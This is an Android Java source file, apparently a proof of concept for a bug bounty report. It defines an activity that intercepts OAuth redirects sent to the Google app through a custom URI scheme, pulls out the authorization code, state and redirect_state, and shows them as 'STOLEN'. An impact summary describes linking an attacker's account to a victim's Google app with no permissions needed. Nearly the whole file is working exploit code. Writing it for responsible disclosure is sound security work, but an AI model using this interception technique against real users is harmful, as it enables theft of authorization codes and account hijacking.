package com.vrp.poc;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.ScrollView;

public class AGSAOAuthInterceptActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(14);
        sv.addView(tv);
        setContentView(sv);

        StringBuilder sb = new StringBuilder();
        sb.append("=== VRP #40: AGSA OAuth Custom Scheme Interception ===\n\n");

        Uri data = getIntent().getData();
        if (data != null) {
            sb.append("INTERCEPTED OAuth redirect!\n\n");
            sb.append("Full URI: ").append(data.toString()).append("\n\n");
            sb.append("Scheme: ").append(data.getScheme()).append("\n");
            sb.append("Host: ").append(data.getHost()).append("\n\n");

            String redirectState = data.getQueryParameter("redirect_state");
            String code = data.getQueryParameter("code");
            String state = data.getQueryParameter("state");
            String error = data.getQueryParameter("error");

            if (redirectState != null) {
                sb.append("STOLEN redirect_state: ").append(redirectState).append("\n");
            }
            if (code != null) {
                sb.append("STOLEN authorization code: ").append(code).append("\n");
            }
            if (state != null) {
                sb.append("STOLEN state: ").append(state).append("\n");
            }
            if (error != null) {
                sb.append("Error: ").append(error).append("\n");
            }

            sb.append("\n=== IMPACT ===\n");
            sb.append("- OAuth authorization code for third-party service stolen\n");
            sb.append("- Can link attacker's account to victim's Google App\n");
            sb.append("- Affects Google Assistant smart home, music services, etc.\n");
            sb.append("- ZERO permissions required\n");
            sb.append("- redirect_state NOT validated by AccountLinkingActivity\n");
        } else {
            sb.append("No intent data received.\n");
            sb.append("Waiting for OAuth redirect...\n");
            sb.append("Trigger: Use Google Assistant to link a third-party service\n");
        }

        tv.setText(sb.toString());
    }
}
